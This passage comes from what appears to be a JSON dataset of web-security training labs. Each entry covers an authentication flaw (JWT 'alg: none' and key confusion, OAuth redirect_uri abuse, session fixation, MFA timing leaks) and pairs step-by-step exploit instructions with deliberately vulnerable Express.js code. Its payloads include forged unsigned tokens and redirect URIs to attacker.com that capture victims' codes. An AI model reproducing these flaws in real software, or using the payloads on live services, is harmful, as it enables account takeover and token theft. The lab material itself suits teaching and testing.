    "JWT signed using public key as HMAC secret"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect URI handling",
  "Lab Description": "The application integrates with a third-party OAuth provider but fails to properly validate redirect URIs. This allows attackers to leak authorization codes to a malicious domain. To solve: steal Carlos's OAuth authorization code using a manipulated redirect URI and gain access to his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to analyze the OAuth flow and locate the GET /auth/oauth?redirect_uri=... endpoint.",
    "Craft a malicious redirect URI pointing to your own domain (e.g. attacker.com/code-capture) and initiate OAuth login using Carlos's session.",
    "Use social engineering or an injected iframe to trick Carlos into authenticating with the provider.",
    "Capture the leaked authorization code on your server from the redirect.",
    "Exchange the code manually via Postman to obtain Carlos's access token and use it to access /user/profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/oauth', (req, res) => { const redirectURI = req.query.redirect_uri; const authURL = `https://oauth.provider.com/auth?client_id=123&redirect_uri=${encodeURIComponent(redirectURI)}&response_type=code`; res.redirect(authURL); }); app.get('/auth/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth.provider.com/token', { code, client_id: '123', client_secret: 'secret', redirect_uri: 'http://vulnerable-app.com/auth/callback' }); const accessToken = tokenRes.data.access_token; res.send(`Access token: ${accessToken}`); }); app.listen(5000);",
  "payloads": [
    "redirect_uri=https://attacker.com/code-steal",
    "GET /auth/oauth?redirect_uri=https://attacker.com",
    "POST /token with stolen code to get victim's token"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in REST login endpoint",
  "Lab Description": "The application uses JWT for session management but does not enforce algorithm validation. Instead, it accepts user-defined algorithms from tokens. The application accepts tokens with 'alg' set to 'none', allowing attackers to forge valid tokens without a signature. To solve: forge a valid admin JWT token and access the /admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture a login request using Burp Suite and analyze the JWT structure from the Authorization header.",
    "Use jwt.io or Burp Decoder to decode the token and verify that it uses HS256 with a base64-encoded signature.",
    "Replace the 'alg' field with 'none' and remove the signature segment.",
    "Set the 'user' claim in the payload to 'admin' and re-encode the token.",
    "Send a GET request to /admin with the modified JWT in the Authorization header and confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'admin': 'supersecret', 'user': 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, 'topsecret', { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid credentials'); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome admin'); } try { const verified = jwt.verify(token, 'topsecret'); if (verified.user === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(401).send('Invalid token'); } res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('JWT Confusion Lab running on http://localhost:3000'));",
  "payloads": [
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
  ]
},
{
  "Lab scenario": "Session fixation via static session identifier in SOAP login",
  "Lab Description": "The application exposes a SOAP-based login mechanism and sets a session ID before user authentication. This session ID is not regenerated after login, allowing an attacker to fix a session ID and force a victim to use it. To solve: fix a session ID and log in as carlos using this fixed session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to inspect SOAP requests and responses. Observe the Set-Cookie header when accessing /soap/login anonymously.",
    "Send a crafted POST login request with a SOAP body authenticating as carlos using Burp Suite and maintain the same session ID from the unauthenticated state.",
    "Capture the session cookie value from the initial unauthenticated request and send it to the victim via a phishing link.",
    "Once the victim logs in, reuse the fixed session ID in your cookie jar.",
    "Access the /my-account endpoint while reusing the fixed session ID and verify access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(cookieParser()); app.use(xmlparser()); const sessions = {}; const users = { 'carlos': 'password123' }; app.post('/soap/login', (req, res) => { let sessionId = req.cookies.session || Math.random().toString(36).substring(7); if (!sessions[sessionId]) sessions[sessionId] = { user: null }; const { Envelope } = req.body; const username = Envelope.Body[0].login[0].username[0]; const password = Envelope.Body[0].login[0].password[0]; if (users[username] === password) { sessions[sessionId].user = username; res.cookie('session', sessionId); return res.send('<response>Login successful</response>'); } res.send('<response>Login failed</response>'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sid && sessions[sid] && sessions[sid].user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "<?xml version=\"1.0\"?><Envelope><Body><login><username>carlos</username><password>password123</password></login></Body></Envelope>",
    "Cookie: session=abc123"
  ]
},
{
  "Lab scenario": "OAuth token leakage via redirect_uri parameter manipulation",
  "Lab Description": "The application uses OAuth 2.0 for SSO login but fails to validate the `redirect_uri` parameter during the authorization flow. An attacker can manipulate this parameter to exfiltrate the victim's access token. To solve: capture Carlos’s access token by abusing the open redirect and access /my-account as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to analyze the OAuth login redirection flow between the app and the authorization server.",
    "Intercept the initial authorization request and modify the redirect_uri to point to your server (e.g., https://attacker.com/callback).",
    "Send the crafted authorization link to the victim. Once clicked, Carlos’s token will be sent to your server.",
    "Extract the access token from the callback logs on your server.",
    "Use Postman to send an authenticated request with the stolen token to /my-account and verify access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const oauthTokens = { 'carlos': 'token-carlos-123' }; const accessLogs = []; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; const user = 'carlos'; const token = oauthTokens[user]; const redirect = `${redirect_uri}?access_token=${token}`; accessLogs.push({ redirect }); res.redirect(redirect); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === oauthTokens['carlos']) return res.send('Welcome carlos'); res.status(403).send('Access denied'); }); app.listen(5000, () => console.log('OAuth Open Redirect Lab running on http://localhost:5000'));",
  "payloads": [
    "https://victim-app.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=token",
    "GET /my-account?access_token=token-carlos-123"
  ]
},
{
  "Lab scenario": "Session fixation in OAuth login flow",
  "Lab Description": "The application implements a third-party OAuth provider for authentication but mishandles session regeneration during login. The vulnerable behavior arises when an attacker fixes a session ID before the OAuth authorization process and the same session is reused after login. To solve: Hijack Carlos’s session by fixing your session ID and making Carlos authenticate over OAuth with it.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate the login process and intercept the OAuth login flow using Burp Suite's Proxy to extract the session cookie value (session=xyz).",
    "Replace your session ID with a custom value using Burp Repeater and complete the OAuth login, confirming the fixed session persists post-login.",
    "Craft a phishing link using the fixed session ID and OAuth redirect URL pointing to the legitimate login provider and send it to Carlos (simulated interaction).",
    "Observe that once Carlos logs in using that link, the server reuses the original session ID without regeneration.",
    "Use the same session cookie (fixed ID) in a new browser session and access /my-account to view Carlos's data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); app.get('/auth/callback', (req, res) => { const user = { username: 'carlos' }; req.session.user = user; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (!req.session.user) return res.status(401).send('Unauthorized'); res.send(`Welcome back ${req.session.user.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Session Fixation Lab on http://localhost:${PORT}`));",
  "payloads": [
    "GET /auth/callback?code=xyz HTTP/1.1",
    "Set-Cookie: session=attacker-session-id",
    "Phishing OAuth link using fixed session: https://vulnerable-app.com/auth/callback?code=abc"
  ]
},
{
  "Lab scenario": "JWT key confusion in asymmetric to symmetric downgrade",
  "Lab Description": "This app uses asymmetric JWT verification (RS256) for session authentication, but fails to validate the signature algorithm properly. If an attacker changes the JWT algorithm to HS256, the server incorrectly uses the public key as a symmetric secret. To solve: Modify the JWT algorithm to HS256 and sign it with the public key to impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture a JWT after authenticating as any user and decode it using jwt.io or a local tool.",
    "Change the JWT header to use algorithm HS256 instead of RS256 and replace the username in the payload with carlos.",
    "Sign the new JWT using the server’s public key (found via /.well-known/jwks.json or embedded endpoint) as HMAC secret.",
    "Send the forged token in Authorization: Bearer <forged_token> via Postman to /my-account endpoint.",
    "Verify that Carlos’s account data is exposed, confirming the signature bypass and lab completion."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, publicKey); res.send(`Account info for ${payload.username}`); } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Key Confusion Lab on http://localhost:${PORT}`));",
  "payloads": [
    "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
    "{\"username\":\"carlos\"}",
    "HS256 signature using HMAC with public key",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "Session timeout bypass via hidden keep-alive endpoint",
  "Lab Description": "This application implements an inactivity-based session timeout mechanism, but includes a hidden GraphQL keep-alive endpoint that can be abused to extend sessions silently. The attacker can keep Carlos's session alive by calling the internal ping endpoint while in possession of his session ID. To solve: Hijack Carlos’s session, maintain it alive using the hidden endpoint, and access /my-account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use OWASP ZAP to spider the site and discover hidden GraphQL endpoint /graphql with operationName: pingSession.",
    "Observe the application sets short-lifetime session cookies; hijack a leaked session cookie (simulated) for Carlos.",
    "Send periodic POST requests to /graphql with payload {operationName: \"pingSession\"} using Postman or Burp Repeater.",
    "Maintain session activity every few seconds to prevent timeout while testing access to /my-account.",
    "Finally access /my-account using the hijacked cookie to validate the bypass."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keep-secret', cookie: { maxAge: 10000 }, resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/graphql', (req, res) => { if (req.body.operationName === 'pingSession') { return res.send({ data: { pingSession: true } }); } res.status(400).send('Invalid operation'); }); app.get('/my-account', (req, res) => { if (!req.session.user || req.session.user !== 'carlos') return res.status(401).send('Unauthorized'); res.send('Carlos account details'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Timeout Bypass Lab on http://localhost:${PORT}`));",
  "payloads": [
    "POST /graphql HTTP/1.1",
    "{\"operationName\":\"pingSession\"}",
    "Cookie: session=carlos-session-id",
    "GET /my-account HTTP/1.1 with same session cookie"
  ]
},
{
  "Lab scenario": "Session Fixation vulnerability in login flow via fixed session ID in cookie header",
  "Lab Description": "The REST-based login flow accepts a session ID from the client before authentication and reuses it after successful login. The application fails to issue a new session identifier after login. To solve: Fixate a session ID and use it to hijack the authenticated session of the victim after login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the GET /login request and observe that a session cookie is issued before login.",
    "2. Send the login request to Burp Repeater and craft a new login POST /login request with a manually fixed session cookie (e.g., sessionid=fixated1234).",
    "3. Using a second browser or curl, perform login using victim credentials while reusing the fixed sessionid=fixated1234.",
    "4. After login, confirm that the same sessionid is still valid and authenticated by visiting GET /account.",
    "5. In your own browser, set your session cookie to sessionid=fixated1234 and access GET /account to hijack the victim session and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); sessions[sid] = user.username; res.cookie('sessionid', sid); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]) { res.send(`Welcome ${sessions[sid]}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "Cookie: sessionid=fixated1234",
    "POST /login with fixed Cookie: sessionid=fixated1234",
    "GET /account with sessionid=fixated1234"
  ]
},
{
  "Lab scenario": "JWT tampering via 'alg: none' in Authorization header",
  "Lab Description": "The application uses JWTs to authorize users via a REST API. However, the server accepts unsigned JWTs when the algorithm is set to 'none'. To solve: Craft a tampered JWT that impersonates the admin user and access the protected endpoint.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use Burp to capture the Authorization: Bearer <JWT> header after logging in as a regular user.",
    "2. Decode the JWT using jwt.io or any JWT tool and modify the payload to {\"username\":\"admin\"} and set \"alg\":\"none\" in the header.",
    "3. Remove the signature part of the JWT so it becomes a two-part token.",
    "4. Replace the Authorization header with the tampered unsigned JWT.",
    "5. Send a GET request to /admin-panel and confirm admin access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secretkey'); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.username === 'admin') return res.send('Welcome admin'); } res.status(403).send('Unauthorized'); }); app.listen(4002, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Authorization: Bearer [tampered_none_alg_token]",
    "GET /admin-panel with unsigned JWT"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect_uri allowing code interception",
  "Lab Description": "The application uses OAuth 2.0 for SSO authentication with a misconfigured redirect URI pattern. An attacker can inject a malicious redirect URI to intercept the authorization code. To solve: Steal Carlos’s OAuth authorization code and exchange it for a token to access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp to inspect the OAuth authorization request (GET /oauth/authorize). Note the redirect_uri parameter pattern and how it lacks strict validation.",
    "2. Set up a temporary request bin or web server to log incoming GET requests.",
    "3. Craft an authorization link with redirect_uri set to your controlled domain (e.g., https://attacker.com/callback).",
    "4. Trick the victim into clicking the link or submit it as part of a CSRF payload.",
    "5. Capture the intercepted code at your endpoint and exchange it via POST /oauth/token to get access_token.",
    "6. Use the token to access the user account via GET /user-info or /account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const oauthCodes = {}; const accessTokens = {}; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); oauthCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (oauthCodes[code]) { const token = 'token-' + Math.random().toString(36).substring(2); accessTokens[token] = oauthCodes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (accessTokens[token]) { return res.send(`Welcome ${accessTokens[token]}`); } res.status(403).send('Invalid token'); }); app.listen(4003, () => console.log('OAuth Code Interception Lab running'));",
  "payloads": [
    "https://vulnerable.app/oauth/authorize?client_id=123&redirect_uri=https://attacker.com/callback&state=xyz",
    "GET /callback?code=stolen_code",
    "POST /oauth/token with stolen_code",
    "GET /account with Authorization: Bearer stolen_token"
  ]
},
{
  "Lab scenario": "Session fixation via legacy auth endpoint in REST login flow",
  "Lab Description": "The application relies on a legacy endpoint for authentication that fails to regenerate the session after login. The application issues a static session ID prior to authentication and does not replace it upon successful login. To solve: Fixate a session ID before login and use it to hijack Carlos’s session post-login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the GET /session/init request and note the Set-Cookie session ID.",
    "2. Manually send a crafted POST /login request with valid credentials for Carlos, reusing the noted session ID.",
    "3. Observe that the server accepts the credentials without issuing a new session ID (session fixation).",
    "4. Use the fixed session ID to access /my-account directly.",
    "5. Confirm access to Carlos’s account to complete the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/session/init', (req, res) => { const sid = uuid.v4(); sessions[sid] = null; res.cookie('session_id', sid); res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies.session_id; if (sessions[sid] !== undefined) { sessions[sid] = username; res.send('Login successful'); } else { res.status(400).send('No session found'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session_id; const user = sessions[sid]; if (user) res.send('Welcome to Carlos\'s account'); else res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "GET /session/init",
    "POST /login {\"username\": \"carlos\", \"password\": \"letmein\"} using fixed session_id cookie",
    "GET /my-account with fixed session_id"
  ]
},
{
  "Lab scenario": "JWT tampering via none algorithm in login API",
  "Lab Description": "This application uses JWTs for session management but improperly allows the 'alg' header to be tampered with. The backend incorrectly trusts tokens signed with 'none' algorithm. To solve: Forge a token using alg: none to impersonate Carlos and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to capture a valid JWT after logging in as a regular user.",
    "2. Decode the token and examine the header and payload fields.",
    "3. Modify the header to use \"alg\": \"none\" and set the payload username to \"carlos\".",
    "4. Remove the signature section and rebase64 the header.payload.",
    "5. Use Burp Suite to set the forged token in the Authorization header and access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); if (decoded.user === 'carlos') res.send('Carlos account data'); else res.send('Access denied'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4001, () => console.log('JWT None Algorithm Lab running on port 4001'));",
  "payloads": [
    "JWT with header: {\"alg\": \"none\"}, payload: {\"user\":\"carlos\"}",
    "Authorization: Bearer <forged_token>",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration leaks access token",
  "Lab Description": "This app uses OAuth 2.0 implicit flow but returns the access token in the URL fragment, which gets logged insecurely due to verbose frontend debug logging. To solve: Steal Carlos’s access token from the client-side logs and access his account using the leaked token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Navigate to /login/oauth and capture the redirected URL after login, which contains the access_token in the fragment (#access_token=...).",
    "2. Open browser dev tools or intercept via OWASP ZAP and observe debug logs leaking the full redirect URL.",
    "3. Extract Carlos's access token from the logs when he logs in.",
    "4. Replay a request to /my-account using Authorization: Bearer <leaked_token>.",
    "5. Confirm successful access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'ey123carlos' }; app.get('/login/oauth', (req, res) => { const user = req.query.user; const token = tokens[user]; res.redirect(`/callback#access_token=${token}`); }); app.get('/callback', (req, res) => { const debugInfo = req.url; console.log('DEBUG LOG:', debugInfo); res.send('OAuth callback page with token in fragment'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer ey123carlos') res.send('Carlos account view'); else res.status(403).send('Unauthorized'); }); app.listen(4002, () => console.log('OAuth Token Leak Lab running on port 4002'));",
  "payloads": [
    "Access token: ey123carlos",
    "Authorization: Bearer ey123carlos",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "OAuth Session Fixation in Authorization Code Flow",
  "Lab Description": "The OAuth implementation in this app allows session fixation during the authorization flow. The application fails to invalidate pre-existing sessions before completing the OAuth login. To solve: Fixate a session using a crafted OAuth URL, then hijack the victim’s session after authorization.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Intercept initial OAuth request using Burp Suite and observe redirection with session cookie",
    "Replay the login flow with a fixed session and send OAuth link to victim",
    "After victim authorizes the app, reuse the same session cookie",
    "Access victim's account using the fixed session",
    "Verify successful hijack by accessing victim’s dashboard"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'sessfix', resave: false, saveUninitialized: true })); app.get('/auth/callback', (req, res) => { const { code } = req.query; if (code === 'valid-oauth-code') { req.session.user = 'victim'; res.redirect('/dashboard'); } else { res.status(401).send('Invalid auth'); } }); app.get('/dashboard', (req, res) => { if (req.session.user) { res.send('Welcome ' + req.session.user); } else { res.status(403).send('Unauthorized'); } }); app.listen(5000);",
  "payloads": [
    "https://vuln-app.com/auth/callback?code=valid-oauth-code",
    "Session: PHPSESSID=fixatedsessioncookie",
    "Replay same session cookie post-authorization"
  ]
},
{
  "Lab scenario": "JWT Algorithm Confusion in Admin Role Verification",
  "Lab Description": "The application uses JWTs for role-based access control but fails to enforce a specific algorithm. This allows token forgery via 'alg' manipulation. To solve: Forge a JWT using 'none' or 'HS256' and escalate privileges to access the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture JWT after login using Burp Suite",
    "Decode and analyze JWT header and payload",
    "Modify header to use 'alg':'none' or 'HS256', and set 'role':'admin'",
    "Sign or strip signature based on algorithm",
    "Use forged token to access /admin and verify role escalation"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'jwt-secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth.split(' ')[1]; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
  "payloads": [
    "{ \"alg\": \"none\" }.{ \"user\": \"carlos\", \"role\": \"admin\" }.",
    "HS256 signed token with 'admin' role using known secret",
    "Authorization: Bearer <forged-token>"
  ]
},
{
  "Lab scenario": "GraphQL Blind MFA Bypass via Timing Attack",
  "Lab Description": "The GraphQL API verifies MFA tokens but leaks timing differences based on token correctness. The application delays responses when the correct prefix is guessed. To solve: Infer valid MFA token character-by-character using response delays, then authenticate as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP or custom script to send GraphQL mutation for MFA validation",
    "Measure response times for incremental brute-force of MFA token",
    "Identify valid characters by analyzing delay patterns",
    "Reconstruct full MFA code using character inference",
    "Submit full token to gain access to Carlos’s account"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const mfaCodes = { 'carlos': '428957' }; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('verifyMfa')) { const match = query.match(/username: \\\"(.*?)\\\", token: \\\"(\\d+)\\\"/); const [, username, token] = match; if (mfaCodes[username].startsWith(token)) { setTimeout(() => { res.json({ data: { verifyMfa: token === mfaCodes[username] } }); }, token.length * 200); } else { res.json({ data: { verifyMfa: false } }); } } }); app.listen(6000);",
  "payloads": [
    "{ \"query\": \"mutation { verifyMfa(username: \\\"carlos\\\", token: \\\"4\\\") }\" }",
    "{ \"query\": \"mutation { verifyMfa(username: \\\"carlos\\\", token: \\\"42\\\") }\" }",
    "{ \"query\": \"mutation { verifyMfa(username: \\\"carlos\\\", token: \\\"428957\\\") }\" }"
  ]
},
{
  "Lab scenario": "Session fixation via predictable token reuse",
  "Lab Description": "The application implements session-based authentication but fails to regenerate session tokens after login. The session remains valid even if the user logs in from a previously fixed session. To solve: hijack Carlos's session by fixing a known session ID before login and accessing his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. In Burp Suite, capture a GET /login request and note the Set-Cookie: session=abc123 format.",
    "2. Modify your request to use a preset session cookie and log in as your own user with the fixed session ID.",
    "3. Send this same session ID to the victim (Carlos) and trick them into logging in using it (simulate via Repeater).",
    "4. After Carlos logs in using the fixed session, reuse the same session ID in your browser.",
    "5. Access /account and confirm Carlos’s account data loads with the fixed session ID."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'hunter2', alice: 'password1' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { const session = req.cookies.session || 'abc123'; sessions[session] = username; res.cookie('session', session); res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) res.send(`Account: ${user}`); else res.send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "Cookie: session=abc123",
    "POST /login with session cookie set before login",
    "GET /account with reused session=abc123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion via 'none' value",
  "Lab Description": "The server incorrectly accepts JWTs signed with the 'none' algorithm due to a misconfigured library. It doesn't verify the signature, allowing token manipulation. To solve: forge a JWT token for the user 'admin' with alg=none and access the admin panel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Capture a JWT from a successful login using Burp Suite.",
    "2. Decode the JWT using jwt.io or Postman, observe the alg: 'HS256'.",
    "3. Craft a new JWT with {\"alg\":\"none\"} and payload: {\"user\":\"admin\"}.",
    "4. Remove the signature entirely and send it as Authorization: Bearer <token>.",
    "5. Access the /admin panel and verify access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { admin: 'adminpass', bob: 'bobpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else res.status(401).send('Invalid'); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome Admin'); } jwt.verify(token, 'secret'); res.send('Token verified'); } catch { res.status(403).send('Invalid Token'); } }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "Authorization: Bearer <JWT-with-none-alg>",
    "GET /admin with tampered JWT"
  ]
},
{
  "Lab scenario": "OAuth token leakage via redirect misconfiguration",
  "Lab Description": "This lab uses OAuth2 for third-party login. However, the redirection URI is not properly validated, allowing token leakage via a malicious redirect endpoint. To solve: steal Carlos’s token using a crafted redirect_uri and access the account resource.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Using Burp Suite, initiate OAuth login and observe the redirect_uri parameter.",
    "2. Modify redirect_uri to point to a controlled domain (e.g., https://attacker.com/capture).",
    "3. Simulate Carlos initiating OAuth login with your crafted URL and capture the token in logs.",
    "4. Extract the token from the redirect_uri fragment or query string.",
    "5. Use the stolen access token in Authorization: Bearer header to access Carlos’s /account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = tokens['carlos']; const redirectUrl = `${redirect_uri}?access_token=${token}&state=${state}`; res.redirect(redirectUrl); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123token') res.send('Carlos Account Accessed'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
  "payloads": [
